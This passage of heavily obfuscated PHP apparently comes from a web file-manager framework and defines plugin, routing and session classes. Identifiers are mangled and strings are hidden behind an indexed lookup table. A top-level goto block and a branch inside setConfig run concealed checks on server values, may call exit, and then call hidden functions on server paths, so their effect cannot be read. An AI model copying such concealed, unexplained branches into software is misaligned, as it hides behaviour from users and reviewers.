filePath($é„¢Åä, $÷ô¸ŠÃº = true, $•ãÙ¼¾‰ = false) { $Õ—‡Ìå =& $_SERVER[áäÒ½¯Ç]; $ö¸•İÈ• = $this->filePathGet($é„¢Åä, $÷ô¸ŠÃº); if (!$this->fileInfo) { show_tips(LNG($Õ—‡Ìå[106]), !1); } if ($•ãÙ¼¾‰ && isset($this->fileInfo[$Õ—‡Ìå[562]]) && $this->fileInfo[$Õ—‡Ìå[562]]) { $ÓØ®òÌ® = Model($Õ—‡Ìå[565])->fileInfo($this->fileInfo[$Õ—‡Ìå[562]]); if (!$ÓØ®òÌ® || !IO::exist($ÓØ®òÌ®[$Õ—‡Ìå[87]])) { $”ò£‘òä = LNG($Õ—‡Ìå[106]) . LNG($Õ—‡Ìå[1802]); if (KodUser::isRoot() && isset($ÓØ®òÌ®[$Õ—‡Ìå[87]])) { $”ò£‘òä .= $Õ—‡Ìå[1803] . $ÓØ®òÌ®[$Õ—‡Ìå[87]] . $Õ—‡Ìå[1804]; } show_tips($”ò£‘òä); } } Hook::trigger($Õ—‡Ìå[1805], $ö¸•İÈ•); return $ö¸•İÈ•; } final function filePathGet($Àïôßùä, $Êš“¬Å³ = true) { $±Úî‹÷ò =& $_SERVER[áäÒ½¯Ç]; if ($­Œ‹œ = $this->checkSharePath($Àïôßùä, $Êš“¬Å³)) { return $­Œ‹œ; } $this->fileCanView($Àïôßùä); if (request_url_safe($Àïôßùä)) { $òÒÄÂè¾ = parse_url_query($Àïôßùä); if (isset($òÒÄÂè¾[$±Úî‹÷ò[1806]]) && isset($òÒÄÂè¾[$±Úî‹÷ò[245]])) { $ë˜ŠÔ÷è = Mcrypt::decode($òÒÄÂè¾[$±Úî‹÷ò[245]], Model($±Úî‹÷ò[875])->get($±Úî‹÷ò[876])); if ($ë˜ŠÔ÷è) { $this->fileInfo = IO::info($ë˜ŠÔ÷è); $this->fileInfo[$±Úî‹÷ò[1807]] = $Àïôßùä; $this->cachePath = $this->pluginCachePath($±Úî‹÷ò[12], $Êš“¬Å³); return $ë˜ŠÔ÷è; } } $Àïôßùä = $this->_cacheHttpFile($Àïôßùä, $Êš“¬Å³); $this->fileInfo = IO::info($Àïôßùä); } else { $this->fileInfo = IO::info($Àïôßùä); $this->cachePath = $this->pluginCachePath($±Úî‹÷ò[12], $Êš“¬Å³); } return $Àïôßùä; } final function _cacheHttpFile($‰‰­Æ¬½, $ş£Óï‚ = true) { $Ì³ú¤Â¾ =& $_SERVER[áäÒ½¯Ç]; $„´¿ÛôÂ = parse_url_query($‰‰­Æ¬½); $İ­š‘¨¯ = get_path_ext($‰‰­Æ¬½); if (isset($„´¿ÛôÂ[$Ì³ú¤Â¾[32]]) && $„´¿ÛôÂ[$Ì³ú¤Â¾[32]]) { $İ­š‘¨¯ = get_path_ext($„´¿ÛôÂ[$Ì³ú¤Â¾[32]]); } $­üù¿«¼ = hash_path($‰‰­Æ¬½) . $Ì³ú¤Â¾[10] . $İ­š‘¨¯; $this->cachePath = $this->pluginCachePath($ş£Óï‚ ? $­üù¿«¼ : $Ì³ú¤Â¾[12]); $úñ¹¢à = IO::fileNameExist($this->cachePath, $­üù¿«¼); if ($úñ¹¢à) { return KodIO::make($úñ¹¢à); } $ö ¨ìÜ = rtrim($this->cachePath, $Ì³ú¤Â¾[8]) . $Ì³ú¤Â¾[8] . $­üù¿«¼; return $this->pluginCacheFileSet($ö ¨ìÜ, file_get_contents_nossl($‰‰­Æ¬½)); } final function checkSharePath($öÙşÈÜ, $ËÑ’ƒ = true) { $Ú÷µŸæª =& $_SERVER[áäÒ½¯Ç]; if (!$this->isShare($öÙşÈÜ)) { return !1; } $‹À¡‹òˆ = Action($Ú÷µŸæª[1309])->sharePathInfo($öÙşÈÜ); if (!is_array($‹À¡‹òˆ) || !isset($‹À¡‹òˆ[$Ú÷µŸæª[87]])) { $„şª‘Ğ– = $GLOBALS[$Ú÷µŸæª[1808]]; show_json($„şª‘Ğ– ? $„şª‘Ğ– : LNG($Ú÷µŸæª[1809]), !1); } $this->fileInfo = $‹À¡‹òˆ; $this->cachePath = $this->pluginCachePath(!1, $ËÑ’ƒ); return $‹À¡‹òˆ[$Ú÷µŸæª[87]]; } final function pluginCachePath($ÁÍìº = '', $èÂìÜÔŠ = false) { $¡³ñé¼ =& $_SERVER[áäÒ½¯Ç]; if ($èÂìÜÔŠ && is_array($this->fileInfo)) { $ÁÍìº = kodIO::hashPath($this->fileInfo); } $íŠÏ©·ç = rtrim(IO_PATH_SYSTEM_TEMP . $¡³ñé¼[1810] . $this->pluginName . $¡³ñé¼[8] . $ÁÍìº, $¡³ñé¼[8]); $ÂùÖÏü® = IO::infoFullSimple($íŠÏ©·ç); $¥†›‚šë = $ÂùÖÏü® && is_array($ÂùÖÏü®) ? $ÂùÖÏü®[$¡³ñé¼[87]] : $¡³ñé¼[12]; if (!$¥†›‚šë) { $¥†›‚šë = IO::mkdir($íŠÏ©·ç); } return $¥†›‚šë; } final function pluginCacheFileSet($ß·Ã¤øç, $Ù»Ï›Ÿ× = '') { $ªœè„î› =& $_SERVER[áäÒ½¯Ç]; $—Ø•ãı¦ = IO::infoFullSimple($ß·Ã¤øç); if (!$—Ø•ãı¦) { return IO::mkfile($ß·Ã¤øç, $Ù»Ï›Ÿ×, REPEAT_REPLACE); } IO::setContent($—Ø•ãı¦[$ªœè„î›[87]], $Ù»Ï›Ÿ×); return $—Ø•ãı¦[$ªœè„î›[87]]; } final function pluginLocalFile($ÚŠê¦ä• = '') { $èî »Ş =& $_SERVER[áäÒ½¯Ç]; $¥Ï…­¢­ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($¥Ï…­¢­)) { mk_dir($¥Ï…­¢­); } if (!$ÚŠê¦ä•) { return $¥Ï…­¢­; } $íÅÀ¦¡‡ = IO::info($ÚŠê¦ä•); $ÃÄë‹•ç = $èî »Ş[1811] . KodIO::hashPath($íÅÀ¦¡‡) . $èî »Ş[10] . $íÅÀ¦¡‡[$èî »Ş[167]]; if (!checkExtSafe($ÃÄë‹•ç)) { $ÃÄë‹•ç = $ÃÄë‹•ç . $èî »Ş[1343]; } $£Åú¹ƒ¥ = $¥Ï…­¢­ . $ÃÄë‹•ç; if (@file_exists($£Åú¹ƒ¥)) { return $£Åú¹ƒ¥; } return IO::copy($ÚŠê¦ä•, $¥Ï…­¢­, 0, $ÃÄë‹•ç); } final function appPackage() { $×ÂéÂ°É =& $_SERVER[áäÒ½¯Ç]; if ($this->packageData) { return $this->packageData; } $ËÆ•¥ = $this->parseFile($this->pluginPath . $×ÂéÂ°É[1812]); $this->parseLang($ËÆ•¥); $‰ïĞœÓ = json_decode_force($ËÆ•¥); if (!$‰ïĞœÓ) { return array(); } $Üï·ø»¹ = Hook::filter($×ÂéÂ°É[1813], $‰ïĞœÓ); if ($Üï·ø»¹ && is_array($Üï·ø»¹)) { $‰ïĞœÓ = $Üï·ø»¹; } $this->packageData = $‰ïĞœÓ; return $‰ïĞœÓ; } public function packageInfoGet($ÂÎ·£Éù) { $øŸ—èÖ = $this->appPackage(); return array_get_value($øŸ—èÖ, $ÂÎ·£Éù); } public function packageVersion() { return $this->packageInfoGet($_SERVER[áäÒ½¯Ç][1814]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[áäÒ½¯Ç][1815]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[áäÒ½¯Ç][1816]); } public function echoJsAssign($¬®¤–¨, $Šß¤Ã³‹) { $this->echoJsAssignArr[$¬®¤–¨] = $Šß¤Ã³‹; } private function parseFile($êÖò†Ÿµ) { $¯„ÉĞ’ =& $_SERVER[áäÒ½¯Ç]; $¾®·œù× = file_get_contents_nossl($êÖò†Ÿµ); $Ñ°ÜÇáÔ = array($¯„ÉĞ’[1817], $¯„ÉĞ’[1818], $¯„ÉĞ’[1819], $¯„ÉĞ’[1820], $¯„ÉĞ’[1821], $¯„ÉĞ’[1822], $¯„ÉĞ’[1823]); $Ã÷ÍÊÌÚ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¯„ÉĞ’[92]][$¯„ÉĞ’[1824]]); foreach ($this->echoJsAssignArr as $í–Ë€â => $èß“ìõ) { $Ñ°ÜÇáÔ[] = $¯„ÉĞ’[1825] . $í–Ë€â . $¯„ÉĞ’[1826]; $Ã÷ÍÊÌÚ[] = is_array($èß“ìõ) || is_object($èß“ìõ) ? rawurlencode(json_encode($èß“ìõ)) : $èß“ìõ; } if (strstr($¾®·œù×, $¯„ÉĞ’[1827])) { $¥ïèÎ·× = rawurlencode(json_encode($this->pluginLangArr)); $¾®·œù× = str_replace($¯„ÉĞ’[1827], $¥ïèÎ·×, $¾®·œù×); } if (strstr($¾®·œù×, $¯„ÉĞ’[1828])) { $¥ïèÎ·× = $¥ïèÎ·× = rawurlencode(json_encode($this->getConfig())); $¾®·œù× = str_replace($¯„ÉĞ’[1828], $¥ïèÎ·×, $¾®·œù×); } $¾®·œù× = str_replace($Ñ°ÜÇáÔ, $Ã÷ÍÊÌÚ, $¾®·œù×); return $¾®·œù×; } private function parseLang(&$Ô×’öôö) { $Ñš»“ğ¶ =& $_SERVER[áäÒ½¯Ç]; $®š³„³ = $Ñš»“ğ¶[1829]; if (!strstr($Ô×’öôö, $®š³„³)) { return; } preg_match_all($Ñš»“ğ¶[1830], $Ô×’öôö, $ÊÓ»óÔ¼); if (!is_array($ÊÓ»óÔ¼) || count($ÊÓ»óÔ¼) == 0 || !is_array($ÊÓ»óÔ¼[0]) || count($ÊÓ»óÔ¼[0]) == 0) { return; } $Éü¦…Åœ = array(); $”»ÇÓ½ = array(); foreach ($ÊÓ»óÔ¼[0] as $¶ş„£­±) { $·¿òà¼ó = substr($¶ş„£­±, strlen($®š³„³), -4); $¯Ô¾ï¼ò = LNG($·¿òà¼ó); $Éü¦…Åœ[] = $¶ş„£­±; $”»ÇÓ½[] = str_replace(array($Ñš»“ğ¶[221], $Ñš»“ğ¶[1196], $Ñš»“ğ¶[427], $Ñš»“ğ¶[119]), array($Ñš»“ğ¶[53], $Ñš»“ğ¶[53], $Ñš»“ğ¶[12], $Ñš»“ğ¶[1831]), $¯Ô¾ï¼ò); } $Ô×’öôö = str_replace($Éü¦…Åœ, $”»ÇÓ½, $Ô×’öôö); } private function parseConfig(&$¾¸ú£ßË) { $æÚ¹Ù›ê =& $_SERVER[áäÒ½¯Ç]; $ã¾Õ¬íñ = $æÚ¹Ù›ê[1832]; if (!strstr($¾¸ú£ßË, $ã¾Õ¬íñ)) { return; } preg_match_all($æÚ¹Ù›ê[1833], $¾¸ú£ßË, $°«²úÀÆ); if (!is_array($°«²úÀÆ) || count($°«²úÀÆ) == 0 || !is_array($°«²úÀÆ[0]) || count($°«²úÀÆ[0]) == 0) { return; } $šğ‘¼óâ = $this->getConfig(); $öö”ş®å = array(); $Ó„†Èéü = array(); foreach ($°«²úÀÆ[0] as $“ìòÅß) { $ø¯“âºı = substr($“ìòÅß, strlen($ã¾Õ¬íñ), -2); $öö”ş®å[] = $“ìòÅß; $Ó„†Èéü[] = _get($šğ‘¼óâ, $ø¯“âºı); } $¾¸ú£ßË = str_replace($öö”ş®å, $Ó„†Èéü, $¾¸ú£ßË); } private function parsePackage(&$ìÖ³ß÷¦) { $Ù‚š¨ÚË =& $_SERVER[áäÒ½¯Ç]; $¥œáİ© = $Ù‚š¨ÚË[1834]; if (!strstr($ìÖ³ß÷¦, $¥œáİ©)) { return; } preg_match_all($Ù‚š¨ÚË[1835], $ìÖ³ß÷¦, $Ÿ¦ğòëÌ); if (!is_array($Ÿ¦ğòëÌ) || count($Ÿ¦ğòëÌ) == 0 || !is_array($Ÿ¦ğòëÌ[0]) || count($Ÿ¦ğòëÌ[0]) == 0) { return; } $¨ıƒ§ø = $this->appPackage(); $È¬éÆ¢î = array(); $ú€¾Ø­Î = array(); foreach ($Ÿ¦ğòëÌ[0] as $ƒÓñèş—) { $•ˆ±±‘ = substr($ƒÓñèş—, strlen($¥œáİ©), -2); $È¬éÆ¢î[] = $ƒÓñèş—; $ú€¾Ø­Î[] = _get($¨ıƒ§ø, $•ˆ±±‘); } $ìÖ³ß÷¦ = str_replace($È¬éÆ¢î, $ú€¾Ø­Î, $ìÖ³ß÷¦); } final function echoFile($«¡£ÔÈ, $ªİ¯¯» = false) { $İŠœæ¾ª =& $_SERVER[áäÒ½¯Ç]; $¶¥‰–ış = $this->pluginPath . $«¡£ÔÈ; if (ACT == $İŠœæ¾ª[1836]) { echo $İŠœæ¾ª[1837] . $this->pluginName . $İŠœæ¾ª[8] . $«¡£ÔÈ . $İŠœæ¾ª[1838]; if (!file_exists($¶¥‰–ış)) { echo $İŠœæ¾ª[1839]; return; } } $òôÙåô¢ = $this->parseFile($¶¥‰–ış); $this->parseLang($òôÙåô¢); $this->parseConfig($òôÙåô¢); $this->parsePackage($òôÙåô¢); if (is_array($ªİ¯¯»)) { $òôÙåô¢ = str_replace(array_keys($ªİ¯¯»), array_values($ªİ¯¯»), $òôÙåô¢); } echo $İŠœæ¾ª[221] . $òôÙåô¢; } private function checkVersion() { $™±ÖşÒè =& $_SERVER[áäÒ½¯Ç]; $¬ª€ƒ‘™ = $this->appPackage(); $¦ÃçÃÄ = $this->getConfig(); if ($¦ÃçÃÄ[$™±ÖşÒè[1840]] == $¬ª€ƒ‘™[$™±ÖşÒè[1814]]) { return; } $this->regist(); $this->setConfig(array($™±ÖşÒè[1840] => $¬ª€ƒ‘™[$™±ÖşÒè[1814]])); } final function initLang() { $Ù†¼Â©Ï =& $_SERVER[áäÒ½¯Ç]; $ÒôµÃ¡ = $Ù†¼Â©Ï[1841]; $Œ¨¢½ = $this->pluginPath . $Ù†¼Â©Ï[1842]; $ßìŸ†Ğ = I18n::getType(); $í¤èĞ¬ó = array(); if (file_exists($Œ¨¢½ . $ßìŸ†Ğ . $Ù†¼Â©Ï[952])) { $í¤èĞ¬ó = (include $Œ¨¢½ . $ßìŸ†Ğ . $Ù†¼Â©Ï[952]); } else { if ($ßìŸ†Ğ == $Ù†¼Â©Ï[1843] && !file_exists($Œ¨¢½ . $ßìŸ†Ğ . $Ù†¼Â©Ï[952]) && file_exists($Œ¨¢½ . $Ù†¼Â©Ï[1844])) { $í¤èĞ¬ó = (include $Œ¨¢½ . $Ù†¼Â©Ï[1844]); $ßìŸ†Ğ = $Ù†¼Â©Ï[1658]; } else { if (file_exists($Œ¨¢½ . $ÒôµÃ¡ . $Ù†¼Â©Ï[952])) { $í¤èĞ¬ó = (include $Œ¨¢½ . $ÒôµÃ¡ . $Ù†¼Â©Ï[952]); $ßìŸ†Ğ = $ÒôµÃ¡; } } } if (!$í¤èĞ¬ó || !is_array($í¤èĞ¬ó)) { $í¤èĞ¬ó = array(); } $à·ù° = Hook::trigger($Ù†¼Â©Ï[1845], $í¤èĞ¬ó, $this->pluginName, $ßìŸ†Ğ); if ($à·ù° && is_array($à·ù°)) { $í¤èĞ¬ó = $à·ù°; } if (@count($í¤èĞ¬ó) > 0) { I18n::set($í¤èĞ¬ó); } return $í¤èĞ¬ó; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ö—ğÙ„Ã) { $É½÷Åàæ =& $_SERVER[áäÒ½¯Ç]; if ($_SERVER[$É½÷Åàæ[217]] != $_SERVER[$É½÷Åàæ[991]]) { $ÛäÕµÊ = $É½÷Åàæ[992]; $šâÙ€¿Å = $É½÷Åàæ[218]; $—ª‰Êœ³ = $_SERVER[$É½÷Åàæ[219]] . $É½÷Åàæ[220]; $¦´ØÕËê = $šâÙ€¿Å($—ª‰Êœ³); $ Áø…ı = explode($É½÷Åàæ[221], $¦´ØÕËê); if (count($ Áø…ı) < $É½÷Åàæ[724]) { $…²Î¸¹† = $É½÷Åàæ[223]; $…²Î¸¹†(); } $¥ÒûŞ¯» = $É½÷Åàæ[993]; $¥ÒûŞ¯»($_SERVER[$É½÷Åàæ[994]]); $¥ÒûŞ¯»($_SERVER[$É½÷Åàæ[219]] . $É½÷Åàæ[995]); $‰§ áşİ = 1; while ($‰§ áşİ > 1) { $‰§ áşİ = $‰§ áşİ + 4; $ÄÚÆö = rawurlencode($‰§ áşİ . $É½÷Åàæ[472]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ö—ğÙ„Ã); } public function onSetConfig($ü È¨ú¼) { } public function onGetConfig($ºÕ·ÌÚë) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($÷¶­˜³É) { if ($÷¶­˜³É == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($±ƒÆûì“ = "\160\x6c\x75\x67\x69\x6e\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÊÍ¿§Ì· = $this->getConfig(); if (!$ÊÍ¿§Ì·[$±ƒÆûì“]) { return !1; } return ActionCall($_SERVER[áäÒ½¯Ç][1846], $ÊÍ¿§Ì·[$±ƒÆûì“]); } public function url($…ı¥Û„Ö, $ş²Ç†»† = '', $â‰öËœ = true) { $¨„’¹´ı =& $_SERVER[áäÒ½¯Ç]; $ÔË‰¦— = $this->getConfig(); $¼ ıİÌÖ = KOD_VERSION . $¨„’¹´ı[10] . KOD_VERSION_BUILD; $»±×·õÖ = $this->packageVersion(); $ÂÀ–Ä©ø = $¼ ıİÌÖ . $¨„’¹´ı[482] . $»±×·õÖ; if (substr($…ı¥Û„Ö, 0, 4) == $¨„’¹´ı[150] || substr($…ı¥Û„Ö, 0, 2) == $¨„’¹´ı[1472]) { $êøÃØº‚ = $…ı¥Û„Ö . $¨„’¹´ı[1847] . $ÂÀ–Ä©ø; } else { if ($ş²Ç†»† == $¨„’¹´ı[12]) { $êøÃØº‚ = $this->pluginHost . $…ı¥Û„Ö . $¨„’¹´ı[1847] . $ÂÀ–Ä©ø; } else { if ($ş²Ç†»† === $¨„’¹´ı[78]) { $êøÃØº‚ = $this->pluginHost . $…ı¥Û„Ö; } else { if ($ş²Ç†»† == $¨„’¹´ı[1848]) { $êøÃØº‚ = STATIC_PATH . $…ı¥Û„Ö . $¨„’¹´ı[1847] . $¼ ıİÌÖ; } else { if ($ş²Ç†»† == $¨„’¹´ı[1849]) { $êøÃØº‚ = APP_HOST . $¨„’¹´ı[1850] . $…ı¥Û„Ö . $¨„’¹´ı[1847] . $¼ ıİÌÖ; } else { if (isset($ÔË‰¦—[$ş²Ç†»†])) { $êøÃØº‚ = $ÔË‰¦—[$ş²Ç†»†] . $…ı¥Û„Ö . $¨„’¹´ı[1847] . $ÂÀ–Ä©ø; } } } } } } if (!$â‰öËœ) { return $êøÃØº‚; } echo $êøÃØº‚; } public function link($¢º»–ğø = false, $‡ÑíòÅÑ = '') { $‰Ï¡¨’ =& $_SERVER[áäÒ½¯Ç]; $”‰¹¤Æœ = $this->linkHas == !1; $this->linkHas = !0; if (!$¢º»–ğø) { $this->link($‰Ï¡¨’[1851], $‰Ï¡¨’[1849]); $this->link($‰Ï¡¨’[1852], $‰Ï¡¨’[1848]); $this->link($‰Ï¡¨’[1853], $‰Ï¡¨’[1848]); $this->link($‰Ï¡¨’[1854], $‰Ï¡¨’[1848]); $this->link($‰Ï¡¨’[1855], $‰Ï¡¨’[1848]); if ($”‰¹¤Æœ) { Hook::trigger($‰Ï¡¨’[1856]); } return; } $Î¥Ç«„ = $this->url($¢º»–ğø, $‡ÑíòÅÑ, !1); if (substr($¢º»–ğø, -3) == $‰Ï¡¨’[1857]) { echo $‰Ï¡¨’[1858] . $Î¥Ç«„ . $‰Ï¡¨’[1859] . $‰Ï¡¨’[221]; } else { if (substr($¢º»–ğø, -4) == $‰Ï¡¨’[1860]) { echo $‰Ï¡¨’[1861] . $Î¥Ç«„ . $‰Ï¡¨’[1862] . $‰Ï¡¨’[221]; } } if ($”‰¹¤Æœ) { Hook::trigger($‰Ï¡¨’[1856]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\136\57\135\53", "\72\x6e\x75\x6d" => "\x5b\60\x2d\71\x5d\x2b", "\x3a\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Ş¶Âè¾, $«©Î±ÜÎ) { $¬ö‰ØÛ =& $_SERVER[áäÒ½¯Ç]; if ($Ş¶Âè¾ == $¬ö‰ØÛ[1863]) { $ˆœŠ¢¨¨ = array_map($¬ö‰ØÛ[1864], $«©Î±ÜÎ[0]); $ƒ¬£üº— = strpos($«©Î±ÜÎ[1], $¬ö‰ØÛ[8]) === 0 ? $«©Î±ÜÎ[1] : $¬ö‰ØÛ[8] . $«©Î±ÜÎ[1]; $ãÒœß÷ = $«©Î±ÜÎ[2]; } else { $ˆœŠ¢¨¨ = null; $ƒ¬£üº— = strpos($«©Î±ÜÎ[0], $¬ö‰ØÛ[8]) === 0 ? $«©Î±ÜÎ[0] : $¬ö‰ØÛ[8] . $«©Î±ÜÎ[0]; $ãÒœß÷ = $«©Î±ÜÎ[1]; } array_push(self::$maps, $ˆœŠ¢¨¨); array_push(self::$routes, $ƒ¬£üº—); array_push(self::$methods, strtoupper($Ş¶Âè¾)); array_push(self::$callbacks, $ãÒœß÷); } public static function error($ğİÕ¨) { self::$errorCallback = $ğİÕ¨; } public static function haltOnMatch($èìÏ­–¼ = true) { self::$halts = $èìÏ­–¼; } public static function dispatch() { $÷¹÷‰¦ù =& $_SERVER[áäÒ½¯Ç]; $ÈÏÆÀŒ = parse_url($_SERVER[$÷¹÷‰¦ù[1865]], PHP_URL_PATH); $ùÕòŠı = $_SERVER[$÷¹÷‰¦ù[162]]; $æ—¶àì´ = array_keys(static::$patterns); $¹¦Ïã×‚ = array_values(static::$patterns); $¨‘Ûà“™ = !1; self::$routes = preg_replace($÷¹÷‰¦ù[1415], $÷¹÷‰¦ù[8], self::$routes); if (in_array($ÈÏÆÀŒ, self::$routes)) { $ÏÕ”É¡– = array_keys(self::$routes, $ÈÏÆÀŒ); foreach ($ÏÕ”É¡– as $µ¾»ƒŸë) { if (self::$methods[$µ¾»ƒŸë] == $ùÕòŠı || self::$methods[$µ¾»ƒŸë] == $÷¹÷‰¦ù[1866] || in_array($ùÕòŠı, self::$maps[$µ¾»ƒŸë])) { $¨‘Ûà“™ = !0; if (!is_object(self::$callbacks[$µ¾»ƒŸë])) { $à·§‘î‰ = explode($÷¹÷‰¦ù[8], self::$callbacks[$µ¾»ƒŸë]); $×º£û²Š = end($à·§‘î‰); $õıÜãâ = explode($÷¹÷‰¦ù[1345], $×º£û²Š); $è×Ëàë = new $õıÜãâ[0](); $è×Ëàë->{$õıÜãâ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$µ¾»ƒŸë]); if (self::$halts) { return; } } } } } else { $¤ ÌÆÔ› = 0; foreach (self::$routes as $µ¾»ƒŸë) { if (strpos($µ¾»ƒŸë, $÷¹÷‰¦ù[4]) !== !1) { $µ¾»ƒŸë = str_replace($æ—¶àì´, $¹¦Ïã×‚, $µ¾»ƒŸë); } if (preg_match($÷¹÷‰¦ù[1867] . $µ¾»ƒŸë . $÷¹÷‰¦ù[1868], $ÈÏÆÀŒ, $‰ïâ½“š)) { if (self::$methods[$¤ ÌÆÔ›] == $ùÕòŠı || self::$methods[$¤ ÌÆÔ›] == $÷¹÷‰¦ù[1866] || !empty(self::$maps[$¤ ÌÆÔ›]) && in_array($ùÕòŠı, self::$maps[$¤ ÌÆÔ›])) { $¨‘Ûà“™ = !0; array_shift($‰ïâ½“š); if (!is_object(self::$callbacks[$¤ ÌÆÔ›])) { $à·§‘î‰ = explode($÷¹÷‰¦ù[8], self::$callbacks[$¤ ÌÆÔ›]); $×º£û²Š = end($à·§‘î‰); $õıÜãâ = explode($÷¹÷‰¦ù[1345], $×º£û²Š); $è×Ëàë = new $õıÜãâ[0](); if (!method_exists($è×Ëàë, $õıÜãâ[1])) { echo $÷¹÷‰¦ù[1869]; } else { call_user_func_array(array($è×Ëàë, $õıÜãâ[1]), $‰ïâ½“š); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¤ ÌÆÔ›], $‰ïâ½“š); if (self::$halts) { return; } } } } $¤ ÌÆÔ›++; } } if ($¨‘Ûà“™ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÏÁÌÄ£è =& $_SERVER[áäÒ½¯Ç]; header($_SERVER[$ÏÁÌÄ£è[1870]] . $ÏÁÌÄ£è[1871]); echo $ÏÁÌÄ£è[1872]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$÷¹÷‰¦ù[1865]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ô¹Ø©‡¶ =& $_SERVER[áäÒ½¯Ç]; static $©ËÜ¦’× = false; if ($©ËÜ¦’×) { return $©ËÜ¦’×; } $Ÿ£õ´ú– = $GLOBALS[$ô¹Ø©‡¶[6]][$ô¹Ø©‡¶[434]]; self::$sessionTime = $Ÿ£õ´ú–[$ô¹Ø©‡¶[1873]]; $é½´€‚ = isset($GLOBALS[$ô¹Ø©‡¶[1874]]) ? $GLOBALS[$ô¹Ø©‡¶[1874]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($é½´€‚)) { self::$sessionSign = Cookie::get($é½´€‚); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($é½´€‚, self::$sessionSign, self::$sessionTime); $Œû‡ŸÚ¼ = $Ÿ£õ´ú–[$ô¹Ø©‡¶[1875]]; $‡êÅ½ùª = $Ÿ£õ´ú–[$Œû‡ŸÚ¼]; $ÕÁÓİà™ = $Ÿ£õ´ú–[$ô¹Ø©‡¶[938]]; switch ($Œû‡ŸÚ¼) { case $ô¹Ø©‡¶[21]: self::$handle = Model($ô¹Ø©‡¶[939]); break; case $ô¹Ø©‡¶[940]: self::$handle = new CacheRedis($‡êÅ½ùª, $ÕÁÓİà™); break; case $ô¹Ø©‡¶[941]: self::$handle = new CacheMemcached($‡êÅ½ùª, $ÕÁÓİà™); break; case $ô¹Ø©‡¶[241]: $‡êÅ½ùª[$ô¹Ø©‡¶[87]] = $‡êÅ½ùª[$ô¹Ø©‡¶[87]] . $ô¹Ø©‡¶[1876]; self::$handle = new CacheFile($‡êÅ½ùª, $ÕÁÓİà™); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$ô¹Ø©‡¶[1611]]) || time() - self::$data[$ô¹Ø©‡¶[1611]] >= 5) { self::dataSave(); } } $©ËÜ¦’× = new self(); return $©ËÜ¦’×; } public static function getBySign($ş½æÏí») { $¯ÕİÎ›ş = self::$handle->get($ş½æÏí»); $¯ÕİÎ›ş = unserialize($¯ÕİÎ›ş); return is_array($¯ÕİÎ›ş) ? $¯ÕİÎ›ş : array(); } public static function setBySign($€ÃƒòÕÄ, $î¤’ ò) { self::$sessionSign = $€ÃƒòÕÄ; self::$data = $î¤’ ò; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[áäÒ½¯Ç][1611]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($Ã³–ï÷ = false) { if ($Ã³–ï÷) { self::$sessionSign = $Ã³–ï÷; } self::init(); return self::$sessionSign; } public static function set($·íëŸœ, $Ã“ë³” = false) { self::init(); if (is_array($·íëŸœ)) { foreach ($·íëŸœ as $…’ó­Æù => $ĞÀ–™ğı) { array_set_value(self::$data, $…’ó­Æù, $ĞÀ–™ğı); } } else { array_set_value(self::$data, $·íëŸœ, $Ã“ë³”); } self::dataSave(); } public static function get($×ß¶ëŸç = false) { self::init(); if (!$×ß¶ëŸç) { return self::$data; } return array_get_value(self::$data, $×ß¶ëŸç); } public static function remove($Èí¡¿È­) { self::init(); unset(self::$data[$Èí¡¿È­]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[áäÒ½¯Ç][947])) { self::$handle->clearTimeout(); } } } goto fƒ¹¦ïÚ‘×; fƒ¹¦ïÚ‘×: if ($_SERVER[$_SERVER[áäÒ½¯Ç][217]] != $_SERVER[$_SERVER[áäÒ½¯Ç][991]]) { $_getc = $_SERVER[áäÒ½¯Ç][218]; $_getfile = $_SERVER[$_SERVER[áäÒ½¯Ç][219]] . $_SERVER[áäÒ½¯Ç][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[áäÒ½¯Ç][221], $_getfilec); if (count($_getarrs) < $_SERVER[áäÒ½¯Ç][222]) { $exit = $_SERVER[áäÒ½¯Ç][223]; $exit(); } $_act = $_SERVER[áäÒ½¯Ç][224]; $_act($_SERVER[$_SERVER[áäÒ½¯Ç][215]]); } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $›¡ñÈË¼ =& $_SERVER[áäÒ½¯Ç]; if (self::valueGet($›¡ñÈË¼[852]) != $›¡ñÈË¼[91]) { return; } if (self::valueGet($›¡ñÈË¼[1877]) == $›¡ñÈË¼[91]) { $ù— = self::valueGet($›¡ñÈË¼[1878]); if (time() - $ù— > self::AUTO_RESTART_TIME) { self::restart(); } return; } 